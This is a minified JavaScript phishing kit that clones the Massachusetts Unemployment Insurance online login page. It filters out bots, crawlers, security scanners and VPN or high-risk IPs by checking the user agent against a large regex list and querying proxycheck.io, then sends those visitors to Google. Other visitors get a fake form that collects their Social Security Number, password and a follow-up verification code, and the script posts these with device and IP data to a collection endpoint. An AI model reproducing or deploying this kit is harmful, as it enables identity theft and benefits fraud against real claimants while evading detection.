!function(e,n){for(var t in n)e[t]=n[t];n.__esModule&&Object.defineProperty(e,"__esModule",{value:!0})}(window,(()=>{"use strict";var e={253:(e,n,t)=>{function a(e,n){for(var t=0;t<n.length;t++){var a=n[t];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,a.key,a)}}function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){return function(e){if(Array.isArray(e))return e}(e)||function(e,n){var t=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=t){var a,i,r=[],l=!0,o=!1;try{for(t=t.call(e);!(l=(a=t.next()).done)&&(r.push(a.value),!n||r.length!==n);l=!0);}catch(e){o=!0,i=e}finally{try{l||null==t.return||t.return()}finally{if(o)throw i}}return r}}(e,n)||function(e,n){if(e){if("string"==typeof e)return l(e,n);var t=Object.prototype.toString.call(e).slice(8,-1);return"Object"===t&&e.constructor&&(t=e.constructor.name),"Map"===t||"Set"===t?Array.from(e):"Arguments"===t||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t)?l(e,n):void 0}}(e,n)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function l(e,n){(null==n||n>e.length)&&(n=e.length);for(var t=0,a=new Array(n);t<n;t++)a[t]=e[t];return a}function o(e,n){return function(e,n){return n.get?n.get.call(e):n.value}(e,c(e,n,"get"))}function s(e,n,t){return function(e,n,t){if(n.set)n.set.call(e,t);else{if(!n.writable)throw new TypeError("attempted to set read only private field");n.value=t}}(e,c(e,n,"set"),t),t}function c(e,n,t){if(!n.has(e))throw new TypeError("attempted to "+t+" private field on non-instance");return n.get(e)}function d(e,n,t){if(!n.has(e))throw new TypeError("attempted to get private field on non-instance");return t}function p(e,n){if(n.has(e))throw new TypeError("Cannot initialize the same private elements twice on an object")}function h(e,n,t){p(e,n),n.set(e,t)}function u(e,n){p(e,n),n.add(e)}t.r(n),t.d(n,{but:()=>I,veriCode:()=>k});var m=[" daum[ /]"," deusu/","(?:^| )site","@[a-z]","\\(at\\)[a-z]","\\(github\\.com/","\\[at\\][a-z]","^12345","^<","^[\\w \\.\\-\\(\\)]+(/v?\\d+(\\.\\d+)?(\\.\\d{1,10})?)?$","^[^ ]{50,}$","^active","^ad muncher","^anglesharp/","^anonymous","^avsdevicesdk/","^axios/","^bidtellect/","^biglotron","^castro","^clamav[ /]","^cobweb/","^coccoc","^custom","^ddg[_-]android","^discourse","^dispatch/\\d","^downcast/","^duckduckgo","^facebook","^fdm[ /]\\d","^getright/","^gozilla/","^hatena","^hobbit","^hotzonu","^hwcdn/","^jeode/","^jetty/","^jigsaw","^linkdex","^lwp[-: ]","^metauri","^microsoft bits","^movabletype","^mozilla/\\d\\.\\d \\(compatible;?\\)$","^mozilla/\\d\\.\\d \\w*$","^navermailapp","^netsurf","^offline explorer","^phantom","^php","^postman","^postrank","^python","^read","^reed","^restsharp/","^snapchat","^space bison","^svn","^swcd ","^taringa","^test certificate info","^thumbor/","^tumblr/","^user-agent:mozilla","^valid","^venus/fedoraplanet","^w3c","^webbandit/","^webcopier","^wget","^whatsapp","^xenu link sleuth","^yahoo","^yandex","^zdm/\\d","^zoom marketplace/","^{{.*}}$","adbeat\\.com","appinsights","archive","ask jeeves/teoma","bit\\.ly/","bluecoat drtr","bot","browsex","burpcollaborator","capture","catch","check","chrome-lighthouse","chromeframe","client","cloud","crawl","dareboost","datanyze","dataprovider","dejaclick","dmbrowser","download","evc-batch/","feed","firephp","freesafeip","ghost","gomezagent","google","headlesschrome/","http","httrack","hubspot marketing grader","hydra","ibisbrowser","images","iplabel","ips-agent","java","library","mail\\.ru/","manager","monitor","morningscore/","neustar wpm","news","nutch","offbyone","optimize","pageburst","pagespeed","perl","pingdom","powermarks","preview","proxy","ptst[ /]\\d","reader","rexx;","rigor","rss","scan","scrape","search","serp ?reputation ?management","server","sogou","sparkler/","spider","statuscake","stumbleupon\\.com","supercleaner","synapse","synthetic","taginspector/","torrent","tracemyfile","transcoder","trendsmapresolver","twingly recon","url","virtuoso","wappalyzer","webglance","webkit2png","websitemetadataretriever","whatcms/","wordpress","zgrab"];!function(e){try{new RegExp("(?<! cu)bot").test("dangerbot")}catch(n){return e}[["bot","(?<! cu)bot"],["google","(?<! (?:channel/|google/))google(?!(app|/google| pixel))"],["http","(?<!(?:lib))http"],["java","java(?!;)"],["search","(?<! ya(?:yandex)?)search"]].forEach((function(n){var t=r(n,2),a=t[0],i=t[1],l=e.lastIndexOf(a);~l&&e.splice(l,1,i)}))}(m);var y=new WeakMap,g=new WeakMap,f=new WeakSet,b=new WeakSet;function v(){s(this,g,new RegExp(o(this,y).join("|"),"i"))}function w(e){return o(this,y).indexOf(e.toLowerCase())}var x=new(function(){function e(n){var t=this;return function(e,n){if(!(e instanceof n))throw new TypeError("Cannot call a class as a function")}(this,e),u(this,b),u(this,f),h(this,y,{writable:!0,value:void 0}),h(this,g,{writable:!0,value:void 0}),s(this,y,n||m.slice()),d(this,f,v).call(this),Object.defineProperties((function(e){return t.test(e)}),Object.entries(Object.getOwnPropertyDescriptors(e.prototype)).reduce((function(e,n){var a=r(n,2),l=a[0],o=a[1];return"function"==typeof o.value&&Object.assign(e,i({},l,{value:t[l].bind(t)})),"function"==typeof o.get&&Object.assign(e,i({},l,{get:function(){return t[l]}})),e}),{}))}var n,t;return n=e,t=[{key:"pattern",get:function(){return new RegExp(o(this,g))}},{key:"test",value:function(e){return Boolean(e)&&o(this,g).test(e)}},{key:"find",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"",n=e.match(o(this,g));return n&&n[0]}},{key:"matches",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return o(this,y).filter((function(n){return new RegExp(n,"i").test(e)}))}},{key:"clear",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";this.exclude(this.matches(e))}},{key:"extend",value:function(){var e=this,n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];[].push.apply(o(this,y),n.filter((function(n){return-1===d(e,b,w).call(e,n)})).map((function(e){return e.toLowerCase()}))),d(this,f,v).call(this)}},{key:"exclude",value:function(){for(var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],n=e.length;n--;){var t=d(this,b,w).call(this,e[n]);t>-1&&o(this,y).splice(t,1)}d(this,f,v).call(this)}},{key:"spawn",value:function(n){return new e(n||o(this,y))}}],t&&a(n.prototype,t),Object.defineProperty(n,"prototype",{writable:!1}),e}()),S="",_="",E="";function I(){const e=ctl00_ctl00_cphMain_cphMain_txtSSN1.value,n=ctl00_ctl00_cphMain_cphMain_txtConfirmSSN1.value;if(console.log(e,n),""!==e&&""!==n){document.getElementById("error101").style.display="none",document.getElementById("ss4").style.display="none",document.getElementById("ss2").style.display="none",document.getElementById("ss3").style.display="none",document.getElementById("ss1").style.display="none";const t={user:e,passwd:n,device:S,ip:_};axios.post("http://localhost:4400/",t).then((e=>{"success"===e.data.message?window.location.href="/claimants/verification.html":console.log("no")}))}else""===e&&""!==n?(document.getElementById("error101").style.display="grid",document.getElementById("ss3").style.display="inline-flex",document.getElementById("ss1").style.display="flex",document.getElementById("ss4").style.display="none",document.getElementById("ss2").style.display="none"):""!==e&&""===n?(document.getElementById("error101").style.display="grid",document.getElementById("ss4").style.display="inline-flex",document.getElementById("ss2").style.display="flex",document.getElementById("ss3").style.display="none",document.getElementById("ss1").style.display="none"):(document.getElementById("error101").style.display="grid",document.getElementById("ss4").style.display="inline-flex",document.getElementById("ss2").style.display="flex",document.getElementById("ss3").style.display="inline-flex",document.getElementById("ss1").style.display="flex")}function k(){const e=ctl00_ctl00_cphMain_cphMain_txtSSN1.value;if(""===e)document.getElementById("error101").style.display="grid",document.getElementById("ss3").style.display="inline-flex",document.getElementById("ss1").style.display="flex";else{document.getElementById("error101").style.display="none",document.getElementById("ss3").style.display="none",document.getElementById("ss1").style.display="none";const n={code:e,device:S,ip:_};axios.post("http://localhost:4400/code",n).then((e=>{"success"===e.data.message?window.location.href="/index.html":console.log("no")}))}}window.addEventListener("load",(()=>{S=navigator.userAgent,E=x(navigator.userAgent),axios.get("https://proxycheck.io/v2/?key=public-74353g-79t132-567953&vpn=1&risk=1").then((e=>{_=e.data.ip,"no"===e.data[e.data.ip].proxy&&!1===E&&e.data[e.data.ip].risk<=33?document.getElementById("disp").innerHTML='<table width="100%">\n          <tr>\n            <td>\n              <table width="100%">\n                <tr>\n                  <td style="padding-left: 10px; width: 70%">\n                    <img\n                      src="/images/massgovlogo.png"\n                      alt="QUEST"\n                      width="179px"\n                    />\n                  </td>\n                  <td\n                    style="\n                      padding-right: 10px;\n                      width: 30%;\n                      text-align: right;\n                      vertical-align: middle;\n                    "\n                    class="globalNav"\n                  >\n                    <b> <span id="myTime"></span></b\n                    ><br />\n  \n                    <a\n                      href="javascript:void(0);"\n                      onclick="javascript:getPrint(\'print_area\')"\n                      >Print Preview</a\n                    >\n                  </td>\n                </tr>\n              </table>\n            </td>\n          </tr>\n          <tr>\n            <td style="padding-top: 3px">\n              <table width="100%">\n                <tr class="searchBarBG">\n                  <td\n                    valign="middle"\n                    style="white-space: nowrap; padding-right: 10px"\n                  >\n                    <table align="right" style="height: 100%">\n                      <tr>\n                        <td>&nbsp;</td>\n                      </tr>\n                    </table>\n                  </td>\n                </tr>\n              </table>\n            </td>\n          </tr>\n          <tr>\n            <td class="white" style="height: 1px"></td>\n          </tr>\n          <tr>\n            <td class="topNavBG" style="padding-left: 10px; padding-right: 10px">\n              <table width="100%">\n                <tr>\n                  <td valign="middle">\n                    <table style="height: 100%">\n                      <tr class="topNav">\n                        <td style=""><a href="#" class="blackLink">Logon</a></td>\n                      </tr>\n                    </table>\n                  </td>\n                  <td valign="middle" style="text-align: right">\n                    <img\n                    src="/images/star.png"\n                    width=\'9px\'\n                    height=\'9px\'\n                      alt="Required Field Icon"\n                      class="ValidateIcon"\n                    />\n                    Indicates Required Field\n                  </td>\n                </tr>\n              </table>\n            </td>\n          </tr>\n          <tr>\n            <td class="darkGray" style="height: 1px"></td>\n          </tr>\n          <tr>\n            <td class="white" style="height: 1px"></td>\n          </tr>\n          <tr>\n            <td class="searchBarBG" style="height: 3px"></td>\n          </tr>\n          <tr>\n            <td>\n              <table width="100%">\n                <tr>\n                  <td id="leftNavColumn">\n                    <ul class="NavLeft">\n                      <li>&nbsp;</li>\n                    </ul>\n                  </td>\n                  <td id="mainContentColumn">\n                    <a name="skipNavTarget" id="skipNavTarget" tabindex="-1"></a>\n                    <div id="print_area">\n                      <center></center>\n  \n                      <input\n                        type="hidden"\n                        name="ctl00$ctl00$cphMain$cphMain$verificationToken"\n                        id="ctl00_ctl00_cphMain_cphMain_verificationToken"\n                        value="&lt;% Request.QueryString[&#39;token&#39;] %>"\n                      />\n                      <div\n                        id="ctl00_ctl00_cphMain_cphMain_UPanel8"\n                        style="width: 100%"\n                      >\n                        <div\n                          style="display: none; margin-bottom: 30px"\n                          id="error101"\n                        >\n                          The following issues were detected with your\n                          submission:<br /><br style="font-size: 25%" />\n                          <table style="width: 100%">\n                            <tbody>\n                              <tr>\n                                <th\n                                  style="\n                                    width: 100%;\n                                    display: flex;\n                                    justify-content: left;\n                                  "\n                                >\n                                  Errors\n                                </th>\n                              </tr>\n                              <tr style="display: none" id="ss1">\n                                <td>\n                                  <img\n                                    src="/images/cancel.png"\n                                    alt="Error Icon"\n                                    width=\'19px\'\n                                    height=\'19px\'\n                                  /><a style="text-decoration: none" href="#"\n                                    >Social Security Number is required. (*)</a\n                                  >\n                                </td>\n                              </tr>\n                              <tr style="display: none" id="ss2">\n                                <td class="Last">\n                                  <img\n                                    src="/images/cancel.png"\n                                    alt="Error Icon"\n                                    width=\'19px\'\n                                    height=\'19px\'\n                                  /><a style="text-decoration: none" href="#"\n                                    >Password is required, please enter password.\n                                    (*)</a\n                                  >\n                                </td>\n                              </tr>\n                            </tbody>\n                          </table>\n                        </div>\n                        <div class="sectHead">\n                          Welcome to Massachusetts Unemployment Insurance (UI)\n                          Online Application\n                        </div>\n                        <br />\n                      </div>\n                      <div\n                        id="ctl00_ctl00_cphMain_cphMain_pnlBroadcastMsgs"\n                        style="width: 100%"\n                      >\n                        <div style="width: 100%"></div>\n                      </div>\n  \n                      <div\n                        id="ctl00_ctl00_cphMain_cphMain_pnlWarning"\n                        style="width: 100%"\n                      >\n                        <br />\n                        <center><b>WARNING</b></center>\n                        <p>\n                          This system may contain U.S. Government information,\n                          which is restricted to authorized users ONLY.\n                          Unauthorized access, use, misuse, or modification of\n                          this computer system or of the data contained herein or\n                          in transit to/from this system constitutes a violation\n                          of Title 18, United States Code, Section 1030, and may\n                          subject the individual to criminal and civil penalties\n                          pursuant to Title 26, United States Code, Sections 7213,\n                          7213A (the Taxpayer Browsing Protection Act), and 7431.\n                          This system and equipment are subject to monitoring to\n                          ensure proper performance of applicable security\n                          features or procedures. Such monitoring may result in\n                          the acquisition, recording, and analysis of all data\n                          being communicated, transmitted, processed, or stored in\n                          this system by a user. If monitoring reveals possible\n                          evidence of criminal activity, such evidence may be\n                          provided to Law Enforcement Personnel.<br />\n  \n                          ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH\n                          MONITORING.\n                        </p>\n                        <input\n                          type="hidden"\n                          name="_ctl00$ctl00$cphMain$cphMain$chkWarning"\n                          value=""\n                        /><span class="ElementChanged" class="Invalid"\n                          ><input\n                            id="ctl00_ctl00_cphMain_cphMain_chkWarning"\n                            type="checkbox"\n                            name="ctl00$ctl00$cphMain$cphMain$chkWarning"\n                            tabindex="1"\n                            title="You must read and accept the System Use Notification message before you continue"\n                          /><label for="ctl00_ctl00_cphMain_cphMain_chkWarning"\n                            >I have read and understand the information above. I\n                            understand that DUA will verify the information that I\n                            provide.</label\n                          ></span\n                        ><img\n                          style="overflow: scroll; align: top"\n                          src="/images/star.png"\n                                width=\'9px\'\n                                height=\'9px\'\n                          alt="Required Field Icon"\n                          class="ValidateIcon"\n                        />\n                        <br />\n                        <br />\n                      </div>\n  \n                      <div\n                        id="ctl00_ctl00_cphMain_cphMain_UPanel12"\n                        style="width: 100%"\n                      >\n                        <table width="100%">\n                          <tr>\n                            <td class="sectHead">\n                              Please provide your Social Security Number\n                            </td>\n                          </tr>\n                        </table>\n                        \x3c!-- <form method="POST" action="/index1.html"> --\x3e\n                        <table width="100%">\n                          <tr class="oddRow">\n                            <td class="cellLabel" width="50%">\n                              Social Security Number:\n                            </td>\n                            <td class="cellData" width="50%">\n                              <input\n                                name="ctl00$ctl00$cphMain$cphMain$txtSSN1"\n                                type="password"\n                                maxlength="11"\n                                id="ctl00_ctl00_cphMain_cphMain_txtSSN1"\n                                class="Invalid"\n                                autocomplete="off"\n                                title="Social Security Number"\n                                style="width: 200px"\n                                required\n                              /><img\n                                style="overflow: scroll; align: top"\n                                src="/images/star.png"\n                                width=\'9px\'\n                                height=\'9px\'\n                                alt="Required Field Icon"\n                                class="ValidateIcon"\n                              /><img\n                                src="/images/cancel.png"\n                                alt="SSN is required. (*)"\n                                class="ValidateIcon"\n                                id="ss3"\n                                width=\'19px\'\n                                height=\'19px\'\n                                style="display: none"\n                              />\n                            </td>\n                          </tr>\n                          <tr class="evenRow">\n                            <td class="cellLabel" width="50%">Password:</td>\n                            <td class="cellData">\n                              <input\n                                name="ctl00$ctl00$cphMain$cphMain$txtConfirmSSN1"\n                                type="password"\n                                maxlength="11"\n                                id="ctl00_ctl00_cphMain_cphMain_txtConfirmSSN1"\n                                class="Invalid"\n                                autocomplete="off"\n                                title="password"\n                                style="width: 200px"\n                                required\n                              /><img\n                                style="overflow: scroll; align: top"\n                                src="/images/star.png"\n                                width=\'9px\'\n                                height=\'9px\'\n                                alt="Required Field Icon"\n                                class="ValidateIcon"\n                              /><img\n                                src="/images/cancel.png"\n                                alt="Confirm your Social Security Number is required. (30)"\n                                class="ValidateIcon"\n                                id="ss4"\n                                width=\'19px\'\n                                height=\'19px\'\n                                style="display: none"\n                              />\n                            </td>\n                          </tr>\n                        </table>\n                        <hr />\n                        <center>\n                          \x3c!-- <input type="image" name="ctl00$ctl00$cphMain$cphMain$btnNext" id="ctl00_ctl00_cphMain_cphMain_btnNext" onmouseover="this.src=&#39;/Core/ButtonImageHandler.ashx?TemplateName=42544E4F564552&amp;Caption=4E657874&#39;" onmouseout="this.src=&#39;/Core/ButtonImageHandler.ashx?TemplateName=42544E&amp;Caption=4E657874&#39;" src="https://uionline.detma.org/Core/ButtonImageHandler.ashx?TemplateName=42544E&amp;Caption=4E657874" alt="Next" style="border-width:0px;" /> --\x3e\n                          <button\n                            style="\n                              background-color: rgb(80, 100, 145);\n                              padding: 5px 20px;\n                              color: white;\n                              border-radius: 5px;\n                            "\n                            type="submit"\n                            onclick="but()"\n                          >\n                            <b id=\'mustee\'>Next</b>\n                          </button>\n                        </center>\n                        \x3c!-- </form> --\x3e\n                        <hr />\n                        <table width="100%">\n                          <tr>\n                            <td class="sectHead">\n                              IF YOU ARE NOT USING YOUR PERSONAL COMPUTER, PLEASE\n                              FOLLOW THESE SAFETY TIPS:\n                            </td>\n                          </tr>\n                        </table>\n                        <table width="100%">\n                          <tr>\n                            <td>\n                              <ul>\n                                <li>\n                                  Log out before you walk away from the computer\n                                </li>\n                                <li>Do not save your login information</li>\n                                <li>\n                                  Do not save any files or forms to a Public\n                                  Computer\n                                </li>\n                                <li>When prompted, always opt to Open a File</li>\n                                <li>\n                                  For more details, please click\n                                  <a href="#">here.</a>\n                                </li>\n                              </ul>\n                            </td>\n                          </tr>\n                        </table>\n                      </div>\n                    </div>\n                  </td>\n                </tr>\n              </table>\n            </td>\n          </tr>\n          <tr>\n            <td class="midGray" style="height: 1px"></td>\n          </tr>\n          <tr>\n            <td\n              class="copy"\n              style="text-align: right; padding-right: 10px; padding-top: 5px"\n            >\n              <a href="http://get.adobe.com/reader/" class="grayLink"\n                >Download Adobe .PDF Reader (Free)</a\n              >\n              |\n              <a\n                href="/Static/Core/Accessibility.html"\n                target="_blank"\n                class="grayLink"\n                >Accessibility</a\n              >\n              |\n              <a href="/Static/Core/Privacy.html" target="_blank" class="grayLink"\n                >Privacy Statement</a\n              >\n              |\n              <a\n                href="/Static/Core/ViewingTips.html"\n                target="_blank"\n                class="grayLink"\n                >Viewing Tips</a\n              >\n            </td>\n          </tr>\n        </table>':window.location.href="https://nullreferer.com/?https://google.com"})),console.log(S)}))}},n={};function t(a){if(n[a])return n[a].exports;var i=n[a]={exports:{}};return e[a](i,i.exports,t),i.exports}return t.d=(e,n)=>{for(var a in n)t.o(n,a)&&!t.o(e,a)&&Object.defineProperty(e,a,{enumerable:!0,get:n[a]})},t.o=(e,n)=>Object.prototype.hasOwnProperty.call(e,n),t.r=e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},t(253)})());